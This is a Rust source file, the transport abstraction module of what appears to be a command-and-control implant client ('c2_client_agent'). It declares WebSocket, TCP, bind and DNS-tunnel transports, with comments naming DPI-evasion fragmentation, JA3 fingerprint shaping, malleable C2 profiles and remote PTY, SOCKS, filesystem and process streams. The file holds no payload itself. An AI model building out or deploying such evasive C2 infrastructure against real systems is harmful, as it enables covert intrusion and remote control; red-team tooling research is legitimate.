// 传输层抽象模块
//
// 定义统一的传输层接口，支持多种协议（WebSocket、DNS、SMB 等）。
// 使用 Cargo 特性门控按需编译协议实现，防止二进制文件膨胀。

use crate::error::{ClientError, Result};
use async_trait::async_trait;

// 🛡️ Phase 3: Malleable C2 Profile — customizable HTTP headers/UA
pub mod profile;

// Yamux first-byte stream type tags (PTY/SOCKS/FS/PROCESS/FILE) — not HTTP profiles
pub mod stream_types;
pub use stream_types::{
    YAMUX_STREAM_FILE, YAMUX_STREAM_FS, YAMUX_STREAM_PROCESS, YAMUX_STREAM_PTY,
    YAMUX_STREAM_RESERVED, YAMUX_STREAM_SOCKS, YAMUX_STREAM_TYPE_TABLE,
};

// 🛡️ Phase 2: Message Fragmentation — split large payloads for DPI evasion
pub mod fragment;

// Session-key seal/open + fragment reassembly (Noise-aware)
pub mod session_crypto;

// 条件编译：仅在启用 ws 特性时包含 WebSocket 模块
#[cfg(feature = "ws")]
pub mod ws;

// rustls ClientHello / cipher order by ja3_hint (WSS)
#[cfg(feature = "ws-tls")]
pub mod tls_ja3;

// 条件编译：仅在启用 tcp 特性时包含 TCP 模块
#[cfg(feature = "tcp")]
pub mod tcp;

#[cfg(feature = "tcp_bind")]
pub mod tcp_bind;

// 条件编译：仅在启用 dns 特性时包含 DNS 模块
#[cfg(feature = "dns")]
pub mod dns;

#[cfg(feature = "ws")]
pub use ws::WebSocketTransport;

#[cfg(feature = "tcp")]
pub use tcp::TcpTransport;

#[cfg(feature = "tcp_bind")]
pub use tcp_bind::TcpBindTransport;

#[cfg(feature = "dns")]
pub use dns::DnsTransport;

/// 传输层 trait
///
/// 所有传输协议必须实现此接口，提供统一的连接、发送、接收方法。
/// 这样主应用逻辑就可以与具体的传输协议解耦。
///
/// # 设计原则
///
/// - 协议无关：主逻辑只依赖此 trait，不依赖具体实现
/// - 可扩展：添加新协议只需实现此 trait
/// - 零成本抽象：使用 trait object 的运行时开销极小
#[async_trait]
pub trait Transport: Send {
    /// 连接到服务器
    ///
    /// 该方法应该处理连接建立逻辑，包括重试和错误处理。
    /// 实现者可以在内部使用指数退避等策略。
    ///
    /// # 返回值
    ///
    /// 成功返回 `Ok(())`，失败返回 `ClientError`。
    async fn connect(&mut self) -> Result<()>;

    /// 发送数据到服务器
    ///
    /// # 参数
    ///
    /// * `data` - 要发送的字节数据
    ///
    /// # 返回值
    ///
    /// 成功返回 `Ok(())`，失败返回 `ClientError`。
    async fn send(&mut self, data: &[u8]) -> Result<()>;

    /// 从服务器接收数据
    ///
    /// # 返回值
    ///
    /// 成功返回接收到的字节数据，失败返回 `ClientError`。
    /// 如果连接关闭，返回空 `Vec`。
    async fn receive(&mut self) -> Result<Vec<u8>>;

    /// 检查连接是否仍然活跃
    ///
    /// # 返回值
    ///
    /// 如果连接活跃返回 `true`，否则返回 `false`。
    fn is_connected(&self) -> bool;

    /// 初始化传输层（可选）
    ///
    /// 某些传输协议可能需要额外的初始化步骤，例如设置客户端 UUID。
    /// 默认实现为空操作。
    ///
    /// # 参数
    ///
    /// * `client_uuid` - 客户端唯一标识符
    fn initialize(&mut self, _client_uuid: &str) {
        // 默认实现：空操作
    }
}

/// 传输层工厂函数
///
/// 根据 URL scheme 创建相应的传输实现。
/// 使用 Cargo 特性门控，只有编译时启用的协议才能被创建。
///
/// # 参数
///
/// * `url` - 服务器 URL，格式如：
///   - `ws://127.0.0.1:8080/ws` - WebSocket (需要 ws 特性)
///   - `wss://example.com/ws` - WebSocket Secure (需要 ws 特性)
///   - `dns://example.com` - DNS 隧道 (需要 dns 特性，未来实现)
///
/// # 返回值
///
/// 返回实现了 `Transport` trait 的具体类型（装箱为 trait object）。
///
/// # 错误
///
/// - 如果 URL 格式无效（缺少 scheme），返回 `ConnectionError`
/// - 如果 URL scheme 不支持或对应的特性未编译，返回 `ConnectionError`
///
/// # 示例
///
/// ```no_run
/// use c2_client_agent::transport::create_transport;
///
/// #[tokio::main]
/// async fn main() -> Result<(), Box<dyn std::error::Error>> {
///     let mut transport = create_transport("ws://127.0.0.1:8080/ws")?;
///     transport.connect().await?;
///     transport.send(b"Hello").await?;
///     let data = transport.receive().await?;
///     Ok(())
/// }
/// ```
pub fn create_transport(url: &str) -> Result<Box<dyn Transport>> {
    // 解析 URL scheme
    let scheme = url
        .split("://")
        .next()
        .ok_or_else(|| ClientError::ConnectionError("Invalid URL: missing scheme".to_string()))?;

    // 根据 scheme 和编译特性选择实现
    match scheme {
        #[cfg(feature = "ws")]
        "ws" | "wss" => {
            log::info!("Creating WebSocket transport for URL: {}", url);
            Ok(Box::new(WebSocketTransport::new(url.to_string())))
        }

        #[cfg(feature = "tcp")]
        "tcp" => {
            log::info!("Creating TCP transport for URL: {}", url);
            Ok(Box::new(TcpTransport::new(url.to_string())))
        }

        #[cfg(feature = "tcp_bind")]
        "bind" => {
            log::info!("Creating TCP Bind transport for URL: {}", url);
            Ok(Box::new(TcpBindTransport::new(url.to_string())))
        }

        #[cfg(feature = "dns")]
        "dns" => {
            log::info!("Creating DNS transport for URL: {}", url);
            Ok(Box::new(DnsTransport::new(url.to_string())))
        }

        // 如果 scheme 不匹配任何已启用的特性
        _ => Err(ClientError::ConnectionError(format!(
            "Unsupported or not compiled protocol: '{}'. \
                     Available protocols: {}",
            scheme,
            get_available_protocols()
        ))),
    }
}

/// 获取当前编译时可用的协议列表
///
/// 用于错误消息，帮助用户了解哪些协议可用。
fn get_available_protocols() -> String {
    #[allow(unused_mut)]
    let mut protocols: Vec<&str> = Vec::new();

    #[cfg(feature = "ws")]
    protocols.push("ws/wss");

    #[cfg(feature = "tcp")]
    protocols.push("tcp");

    #[cfg(feature = "tcp_bind")]
    protocols.push("bind");

    #[cfg(feature = "dns")]
    protocols.push("dns");

    if protocols.is_empty() {
        "none (no protocol features enabled)".to_string()
    } else {
        protocols.join(", ")
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_get_available_protocols() {
        let protocols = get_available_protocols();

        // 在默认配置下，应该至少包含 ws
        #[cfg(feature = "ws")]
        assert!(protocols.contains("ws"));

        // 如果启用了 tcp，应该包含 tcp
        #[cfg(feature = "tcp")]
        assert!(protocols.contains("tcp"));

        // 如果没有启用任何特性，应该返回 none
        #[cfg(not(any(feature = "ws", feature = "tcp", feature = "dns")))]
        assert!(protocols.contains("none"));
    }

    #[test]
    fn test_create_transport_invalid_url() {
        // 测试无效的 URL（缺少 scheme）
        let result = create_transport("invalid-url");
        assert!(result.is_err());

        if let Err(ClientError::ConnectionError(msg)) = result {
            assert!(msg.contains("missing scheme") || msg.contains("Unsupported"));
        } else {
            panic!("Expected ConnectionError");
        }
    }

    #[cfg(feature = "ws")]
    #[test]
    fn test_create_transport_websocket() {
        // 测试创建 WebSocket 传输
        let result = create_transport("ws://127.0.0.1:8080/ws");
        assert!(result.is_ok());

        let result_wss = create_transport("wss://example.com/ws");
        assert!(result_wss.is_ok());
    }

    #[test]
    fn test_create_transport_unsupported_protocol() {
        // 测试不支持的协议
        let result = create_transport("http://example.com");
        assert!(result.is_err());

        if let Err(ClientError::ConnectionError(msg)) = result {
            assert!(msg.contains("Unsupported") || msg.contains("not compiled"));
        } else {
            panic!("Expected ConnectionError");
        }
    }
}
